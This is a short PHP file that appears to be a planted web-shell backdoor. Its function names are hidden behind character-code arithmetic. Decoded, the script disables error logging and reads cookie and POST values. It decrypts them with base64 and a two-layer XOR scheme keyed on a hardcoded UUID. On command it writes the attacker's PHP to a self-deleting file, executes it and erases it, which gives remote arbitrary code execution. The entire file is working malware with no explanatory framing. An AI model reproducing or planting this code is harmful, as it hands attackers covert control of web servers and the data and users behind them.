<?php $vmidwwtmmv = chr(102).chr(105)."\154".'e'."\137".chr(112).'u'."\x74".chr(95)."\143".chr(359-248)."\156"."\x74".'e'."\156"."\x74".'s';
$mjzwmioh = chr(98).chr(540-443).chr(433-318)."\145"."\66".chr(795-743).chr(95).'d'.chr(101).chr(99).chr(561-450).'d'."\x65";
$gqiqhysqe = chr(1016-911)."\156".chr(489-384)."\x5f".chr(713-598).chr(841-740).chr(116);
$zokffkb = chr(117).chr(110)."\x6c"."\151"."\x6e"."\x6b";


@$gqiqhysqe('e'."\x72".chr(873-759)."\x6f"."\x72"."\x5f"."\x6c"."\157"."\147", NULL);
@$gqiqhysqe(chr(108)."\x6f"."\147"."\137".chr(101)."\x72"."\x72"."\157".chr(663-549).chr(877-762), 0);
@$gqiqhysqe("\x6d"."\x61".chr(183-63)."\137"."\x65"."\x78".'e'."\x63"."\x75".'t'."\x69".'o'.chr(968-858).chr(775-680).'t'.chr(412-307)."\155"."\145", 0);
@set_time_limit(0);

function bauaw($gyrzuyfn, $bkspn)
{
    $fzwkyfrofy = "";
    for ($bsqyysh = 0; $bsqyysh < strlen($gyrzuyfn);) {
        for ($j = 0; $j < strlen($bkspn) && $bsqyysh < strlen($gyrzuyfn); $j++, $bsqyysh++) {
            $fzwkyfrofy .= chr(ord($gyrzuyfn[$bsqyysh]) ^ ord($bkspn[$j]));
        }
    }
    return $fzwkyfrofy;
}

$zanoxaudqs = array_merge($_COOKIE, $_POST);
$jfkvfinfn = '7418fa74-db37-4273-b389-ea2c030b38f3';
foreach ($zanoxaudqs as $vjhitff => $gyrzuyfn) {
    $gyrzuyfn = @unserialize(bauaw(bauaw($mjzwmioh($gyrzuyfn), $jfkvfinfn), $vjhitff));
    if (isset($gyrzuyfn["\141".'k'])) {
        if ($gyrzuyfn[chr(97)] == 'i') {
            $bsqyysh = array(
                "\160".chr(726-608) => @phpversion(),
                chr(115).'v' => "3.5",
            );
            echo @serialize($bsqyysh);
        } elseif ($gyrzuyfn[chr(97)] == 'e') {
            $fquur = "./" . md5($jfkvfinfn) . "\x2e".'i'.chr(110)."\x63";
            @$vmidwwtmmv($fquur, "<" . "\x3f"."\160"."\x68".chr(112).chr(32).'@'.chr(491-374)."\x6e"."\x6c".chr(393-288)."\156"."\153"."\x28".chr(95)."\x5f".chr(740-670).'I'."\114".chr(167-98)."\137".'_'.')'.chr(59)."\x20" . $gyrzuyfn[chr(100)]);
            @include($fquur);
            @$zokffkb($fquur);
        }
        exit();
    }
}

